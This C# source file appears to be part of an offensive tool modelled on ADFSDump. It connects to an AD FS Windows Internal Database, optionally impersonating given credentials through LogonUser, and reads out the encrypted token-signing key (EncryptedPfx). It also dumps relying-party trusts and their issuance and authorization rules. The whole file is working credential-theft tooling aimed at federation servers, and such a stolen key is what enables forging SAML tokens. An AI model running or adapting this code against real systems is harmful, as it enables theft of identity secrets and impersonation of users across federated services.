using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;
using System.Xml;
using System.Security;
using System.Security.Principal;
using System.Runtime.InteropServices;
using ADumpFS.RelyingPartyTrust;

namespace ADumpFS.ReadDB
{
    internal static class NativeMethods
    {
        public const int LOGON32_LOGON_NEW_CREDENTIALS = 9;
        public const int LOGON32_PROVIDER_WINNT50 = 3;

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool LogonUser(
            string username,
            string domain,
            string password,
            int logonType,
            int logonProvider,
            out IntPtr token);

        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr handle);
    }

    public static class DatabaseReader
    {
        private const string WidConnectionString = "Data Source=np:\\\\.\\pipe\\microsoft##wid\\tsql\\query;Integrated Security=SSPI";
        private const string WidConnectionStringLegacy = "Data Source=np:\\\\.\\pipe\\MSSQL$MICROSOFT##SSEE\\sql\\query;Integrated Security=SSPI";

        private const string ReadEncryptedPfxQuery = "SELECT ServiceSettingsData from {0}.IdentityServerPolicy.ServiceSettings";
        private const string ReadScopePolicies = "SELECT SCOPES.ScopeId,SCOPES.Name,SCOPES.WSFederationPassiveEndpoint,SCOPES.Enabled,SCOPES.SignatureAlgorithm,SCOPES.EntityId,SCOPES.EncryptionCertificate,SCOPES.MustEncryptNameId, SCOPES.SamlResponseSignatureType, SCOPES.ParameterInterface, SAML.Binding, SAML.Location,POLICYTEMPLATE.name, POLICYTEMPLATE.PolicyMetadata, POLICYTEMPLATE.InterfaceVersion, SCOPEIDS.IdentityData FROM {0}.IdentityServerPolicy.Scopes SCOPES LEFT OUTER JOIN {0}.IdentityServerPolicy.ScopeAssertionConsumerServices SAML ON SCOPES.ScopeId = SAML.ScopeId LEFT OUTER JOIN {0}.IdentityServerPolicy.PolicyTemplates POLICYTEMPLATE ON SCOPES.PolicyTemplateId = POLICYTEMPLATE.PolicyTemplateId LEFT OUTER JOIN {0}.IdentityServerPolicy.ScopeIdentities SCOPEIDS ON SCOPES.ScopeId = SCOPEIDS.ScopeId";
        private const string ReadScopePoliciesLegacy = "SELECT SCOPES.ScopeId,SCOPES.Name,SCOPES.WSFederationPassiveEndpoint,SCOPES.Enabled,SCOPES.SignatureAlgorithm,SCOPES.EntityId,SCOPES.EncryptionCertificate,SCOPES.MustEncryptNameId,SCOPES.SamlResponseSignatureType, SAML.Binding, SAML.Location, SCOPEIDS.IdentityData FROM {0}.IdentityServerPolicy.Scopes SCOPES LEFT OUTER JOIN {0}.IdentityServerPolicy.ScopeAssertionConsumerServices SAML ON SCOPES.ScopeId = SAML.ScopeId LEFT OUTER JOIN {0}.IdentityServerPolicy.ScopeIdentities SCOPEIDS ON SCOPES.ScopeId = SCOPEIDS.ScopeId";
        private const string ReadRules = "Select SCOPE.ScopeId, SCOPE.name, POLICIES.PolicyData,POLICIES.PolicyType, POLICIES.PolicyUsage FROM {0}.IdentityServerPolicy.Scopes SCOPE INNER JOIN {0}.IdentityServerPolicy.ScopePolicies SCOPEPOLICIES ON SCOPE.ScopeId = SCOPEPOLICIES.ScopeId INNER JOIN {0}.IdentityServerPolicy.Policies POLICIES ON SCOPEPOLICIES.PolicyId = POLICIES.PolicyId";
        private const string ReadDatabases = "SELECT name FROM sys.databases";

        private const string Adfs2012R2 = "AdfsConfiguration";
        private const string Adfs2016 = "AdfsConfigurationV3";
        private const string Adfs2019 = "AdfsConfigurationV4";

        private static readonly string[] BuiltInScopes =
        {
            "SelfScope", "ProxyTrustProvisionRelyingParty", "Device Registration Service",
            "UserInfo", "PRTUpdateRp", "Windows Hello - Certificate Provisioning Service", "urn:AppProxy:com"
        };

        public static Dictionary<string, RelyingParty>.ValueCollection ReadConfigurationDb(Dictionary<string, string> arguments)
        {
            SqlConnection conn = null;
            WindowsImpersonationContext impersonationContext = null;
            IntPtr tokenHandle = IntPtr.Zero;

            string connectionString;

            if (arguments.ContainsKey("/database"))
                connectionString = arguments["/database"];
            else
            {
                var os = Environment.OSVersion;
                connectionString =
                    (os.Version.Major == 6 && os.Version.Minor <= 1) || os.Version.Major < 6
                        ? WidConnectionStringLegacy
                        : WidConnectionString;
            }

            try
            {
                var builder = new SqlConnectionStringBuilder(connectionString);
                builder.IntegratedSecurity = true;

                if (arguments.ContainsKey("/user") && arguments.ContainsKey("/password"))
                {
                    string fullUser = arguments["/user"];
                    string password = arguments["/password"];

                    string domain = "";
                    string username = fullUser;

                    if (fullUser.Contains("\\"))
                    {
                        var parts = fullUser.Split('\\');
                        domain = parts[0];
                        username = parts[1];
                    }

                    bool success = NativeMethods.LogonUser(
                        username,
                        domain,
                        password,
                        NativeMethods.LOGON32_LOGON_NEW_CREDENTIALS,
                        NativeMethods.LOGON32_PROVIDER_WINNT50,
                        out tokenHandle
                    );

                    if (!success)
                        throw new SecurityException("LogonUser failed");

                    WindowsIdentity identity = new WindowsIdentity(tokenHandle);
                    impersonationContext = identity.Impersonate();
                }

                conn = new SqlConnection(builder.ConnectionString);
                conn.Open();
            }
            catch (Exception e)
            {
                Console.WriteLine($"!!! Error connecting to database: {e.Message}");
                impersonationContext?.Undo();
                if (tokenHandle != IntPtr.Zero)
                    NativeMethods.CloseHandle(tokenHandle);
                return null;
            }

            try
            {
                string adfsVersion = GetAdfsVersion(conn);
                if (string.IsNullOrEmpty(adfsVersion))
                {
                    Console.WriteLine("!! Error identifying AD FS version");
                    return null;
                }

                return ReadWid(adfsVersion, conn);
            }
            finally
            {
                conn?.Close();
                impersonationContext?.Undo();
                if (tokenHandle != IntPtr.Zero)
                    NativeMethods.CloseHandle(tokenHandle);
            }
        }

        public static string SafeGetString(this SqlDataReader reader, string colName)
        {
            int index = reader.GetOrdinal(colName);
            return !reader.IsDBNull(index) ? reader.GetString(index) : string.Empty;
        }

        private static string GetAdfsVersion(SqlConnection conn)
        {
            try
            {
                using (var cmd = new SqlCommand(ReadDatabases, conn))
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        string dbName = (string)reader["name"];
                        if (dbName.Contains("AdfsConfiguration"))
                            return dbName;
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"!! Exception enumerating databases: {e.Message}");
            }

            return null;
        }

        private static Dictionary<string, RelyingParty>.ValueCollection ReadWid(string dbName, SqlConnection conn)
        {
            var rps = new Dictionary<string, RelyingParty>();

            try
            {
                using (var cmd = new SqlCommand(string.Format(ReadEncryptedPfxQuery, dbName), conn))
                using (var reader = cmd.ExecuteReader())
                {
                    Console.WriteLine("## Reading Encrypted Signing Key from Database");

                    while (reader.Read())
                    {
                        string xmlString = (string)reader["ServiceSettingsData"];

                        XmlDocument xmlDocument = new XmlDocument();
                        xmlDocument.LoadXml(xmlString);

                        var signingToken = xmlDocument.DocumentElement
                            .GetElementsByTagName("SigningToken")[0] as XmlElement;

                        if (signingToken != null)
                        {
                            var encryptedPfx = signingToken.GetElementsByTagName("EncryptedPfx")[0];
                            if (encryptedPfx != null)
                                Console.WriteLine("[-] Encrypted Token Signing Key Begin\r\n{0}\r\n[-] Encrypted Token Signing Key End\r\n",
                                    encryptedPfx.InnerText);
                        }
                    }
                }

                string scopeQuery = dbName == Adfs2012R2
                    ? string.Format(ReadScopePoliciesLegacy, dbName)
                    : string.Format(ReadScopePolicies, dbName);

                using (var cmd = new SqlCommand(scopeQuery, conn))
                using (var reader = cmd.ExecuteReader())
                {
                    Console.WriteLine("## Reading Relying Party Trust Information from Database");

                    while (reader.Read())
                    {
                        string name = reader.SafeGetString("Name");
                        if (BuiltInScopes.Any(name.Contains))
                            continue;

                        string scopeId = reader["ScopeId"].ToString();

                        var rp = new RelyingParty
                        {
                            Name = name,
                            Id = scopeId,
                            IsEnabled = (bool)reader["Enabled"],
                            SignatureAlgorithm = reader.SafeGetString("SignatureAlgorithm"),
                            Identity = reader.SafeGetString("IdentityData"),
                            EncryptionCert = reader.SafeGetString("EncryptionCertificate"),
                            SamlResponseSignatureType = (int)reader["SamlResponseSignatureType"]
                        };

                        if (dbName != Adfs2012R2)
                        {
                            rp.AccessPolicy = reader.SafeGetString("PolicyMetadata");
                            rp.AccessPolicyParam = reader.SafeGetString("ParameterInterface");
                        }

                        rp.FederationEndpoint =
                            reader.IsDBNull(2)
                                ? reader.SafeGetString("Location")
                                : reader.SafeGetString("WSFederationPassiveEndpoint");

                        rp.IsSaml = reader.IsDBNull(2);
                        rp.IsWsFed = !reader.IsDBNull(2);

                        rps[scopeId] = rp;
                    }
                }

                using (var cmd = new SqlCommand(string.Format(ReadRules, dbName), conn))
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        string scopeId = reader["ScopeId"].ToString();
                        string rule = reader.SafeGetString("PolicyData");

                        if (!rps.ContainsKey(scopeId) || string.IsNullOrEmpty(rule))
                            continue;

                        PolicyType ruleType = (PolicyType)reader["PolicyUsage"];

                        switch (ruleType)
                        {
                            case PolicyType.StrongAuthAuthorizationRules:
                                rps[scopeId].StrongAuthRules = rule;
                                break;

                            case PolicyType.OnBehalfAuthorizationRules:
                                rps[scopeId].OnBehalfAuthRules = rule;
                                break;

                            case PolicyType.ActAsAuthorizationRules:
                                rps[scopeId].AuthRules = rule;
                                break;

                            case PolicyType.IssuanceRules:
                                rps[scopeId].IssuanceRules = rule;
                                break;
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"!!! Exception: {e.Message}");
            }

            return rps.Values;
        }
    }
}
